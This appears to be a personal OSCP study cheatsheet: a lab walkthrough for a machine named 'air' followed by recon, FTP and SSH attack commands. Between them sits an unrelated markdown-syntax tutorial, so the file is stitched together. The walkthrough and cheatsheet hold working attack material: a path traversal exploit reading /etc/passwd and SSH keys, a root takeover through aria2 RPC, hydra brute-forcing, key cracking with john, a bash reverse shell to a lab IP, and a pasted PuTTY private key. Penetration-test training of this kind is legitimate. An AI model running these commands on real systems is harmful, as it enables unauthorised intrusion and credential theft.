### **_OSCP Cheatsheet_**
machines
- air
Recon
nmap -sT -p- --reason -vvv 192.168.213.100 -oN nmap-air3-tcp.txt
*rustscan -a $IP --ulimit=5000
**sudo nmap -Pn -n $IP -sC -sV -p- --open
port 8888
aria2filters Cookie
public exploit cve-2023-39141
https://www.youtube.com/watch?v=kAFKJWUtN6c
curl --path-as-is http://localhost:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
Foothold
path traversal and /.ssh/id_rsa
then cut and pasted the id_rsa into to a file on my kali machine

netstat -antup
PrivEsc
linpeas
mkdir /dev/shm/.attack
cd /dev/shm/.attack
wget http://<attack Website>/linpeas.sh && chmod 777 linpeas.sh && ./linpeas.sh

 we see the rpc-secret is obfuscated with asterisks, but there must be a startup script or configuration file somewhere on the system that is setting the secret.

 find / -iname aria2* -type f 2>/dev/null
cat /etc/systemd/system/aria2.service

My first thought was that if I cannot connect to port 6800 from the external network then maybe I can connect to port 6800 from the target’s localhost. To connect to the target’s localhost I would need to setup a tunnel.

My preferred tunneling method is to use Ligolo-ng. 

Setting up Ligolo Tunnel
If you need to download Ligolo-ng here is the git repository https://github.com/nicocha30/ligolo-ng
and a here’s great walk-through video https://www.youtube.com/watch?v=DM1B8S80EvQ


Privilege Escalation (Continued)
With the tunnel setup, I went about trying to connect to the internal version of Aria2 WebUi app to the RPC server.

For those using Ligolo-ng you can use the magic IP in your web browser to connect to the internal version of the Aria2 WebUi app: http://240.0.0.1:8888

Once the internal Aria2 WebUi app is opened, go to Settings > Connection Settings. Change the port number to 6800 and enter the secret token we found above.

echo "test" > test.txt

Not only was I able to confirm the file was downloaded, I also discovered the file was owned by root!

Since the file was owned by root I decided to try and make an ssh key pair and attempt to ssh in as root.

On kali I created my ssh key pair and renamed the public key to authorized_keys and set the permissions for root-id_rsa to owner read/write

Note: I named the key pair: root-id_rsa

ssh-keygen -t rsa
mv root-id_rsa.pub authorized_keys
chmod 600 root-id_rsa

Following the same steps as before I setup a download for the newly created authorized_keys file to be downloaded the target’s /root/.ssh directory

ssh -i root-id_rsa root@aria2


#### Reconnaisance

#### Some specific ports

#### FUZZING

#### Pivoting

#### PrivEsc


#### Heading 4


### **_Headings_**


# Heading 1
## Heading 2
### Heading 3
#### Heading 4
##### Heading 5
###### Heading 6

### **_Emphasis_**

Using two asterisks **this text is bold**.  
Two underscores __work as well__.  
Let's make it *italic now*.  
You guessed it, _one underscore is also enough_.  
Can we combine **_both of that_?** Absolutely.
What if I want to ~~strikethrough~~?

### **_Blockquote_**

> This is a blockquote.
> Want to write on a new line with space between?
>
> > And nested? No problem at all.
> >
> > > PS. you can **style** your text _as you want_.

### **_Images_**


![text if the image fails to load](auto-generated-path-to-file-when-you-upload-image "Text displayed on hover")

[logo]: auto-generated-path-to-file-when-you-upload-image "Hover me"
![error text][logo]

### **_Links_**

[markdown-cheatsheet]: https://github.com/im-luka/markdown-cheatsheet
[docs]: https://github.com/adam-p/markdown-here

[Like it so far? Follow me on GitHub](https://github.com/im-luka)
[My Markdown Cheatsheet - star it if you like it][markdown-cheatsheet]
Find some great docs [here][docs]

### **_Code_**
I created `.env` file at the root.
    Backticks inside backticks? `` `No problem.` ``

    ```
    {
      learning: "Markdown",
      showing: "block code snippet"
    }
    ```

    ```js
    const x = "Block code snippet in JS";
    console.log(x);
    ```

### **_Lists_**
    1. HTML
2. CSS
3. Javascript
4. React
7. I'm Frontend Dev now 👨🏼‍🎨



- Node.js
+ Express
* Nest.js
- Learning Backend ⌛️



1. Learn Basics
   1. HTML
   2. CSS
   7. Javascript
2. Learn One Framework
   - React 
     - Router
     - Redux
   * Vue
   + Svelte

### **_Tables_**

| Left Align (default) | Center Align | Right Align |
| :------------------- | :----------: | ----------: |
| React.js             | Node.js      | MySQL       |
| Next.js              | Express      | MongoDB     |
| Vue.js               | Nest.js      | Redis       |

### **_Lines_**

First Horizontal Line

***

Second One

-----

Third

_________

### **_Tasks_**

- [x] Learn Markdown
- [ ] Learn Frontend Development
- [ ] Learn Full Stack Development


### **_HTMLs_**

<h1>This is a heading</h1>
<p>Paragraph...</p>

<hr />

<img src="auto-generated-path-to-file-when-you-upload-image" width="200">
<a href="https://github.com/im-luka">Follow me on GitHub</a>

<br />
<br />

<p>Quick hack for <strong><em>centering image</em></strong>?</p>
<p align="center"><img src="auto-generated-path-to-file-when-you-upload-image" /></p>

<details>
  <summary>One more quick hack? 🎭</summary>
  
  → Easy  
  → And simple
</details>



## **_Enumerations_**

### nmap

````
ping $IP #63 ttl = linux #127 ttl = windows
````
````
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
````
````
nmap -p <ports> -sV -sC -A $IP
````
###### Stealth Scan
````
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
````
###### UDP Scan
````
sudo nmap -F -sU -sV $IP
````
###### Script to automate Network Enumeration
````
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
````
### Autorecon
````
autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
````
### Rust Scan
````
target/release/rustscan -a 10.11.1.252
````

### Port Enumeration
#### FTP port 21

````
ftp -A $IP
ftp $IP
anonymous:anonymous
put test.txt #check if it is reflected in a http port
````
###### Upload binaries
````
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````
##### Brute Force
````
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
````
##### Downloading files recursively
````
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/
````
````
find / -name Settings.*  2>/dev/null #looking through the files
````

#### SSH port 22
##### putty tools
````
sudo apt upgrade && sudo apt install putty-tools
````
##### puttygen 
````
cat keeper.txt          
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

````

````
puttygen keeper.txt -O private-openssh -o id_rsa
````
````
chmod 600 id_rsa
````
````
ssh root@10.10.11.227 -i id_rsa
````

##### Emumeration
##### Exploitation
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USERB@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'

nc -nvlp 443
````
###### no matching key exchange method found.
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
 -oHostKeyAlgorithms=+ssh-rsa\
 -oCiphers=+aes256-cbc\
 admin@10.11.1.252 -p 22000
````
##### Brute Force
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
````
##### Private key obtained
````
chmod 600 id_rsa
ssh userb@172.16.138.14 -i id_rsa
````
##### Public key obtained
````
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= USERZ@example #new user found
````
##### Cracking Private Key
````
ssh2john id_ecdsa > id_ecdsa.hash

cat id_ecdsa.hash 
id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash

fireball         (id_ecdsa)
````


###### nmap second
###### nmap third

##### autorecon

###### nmap
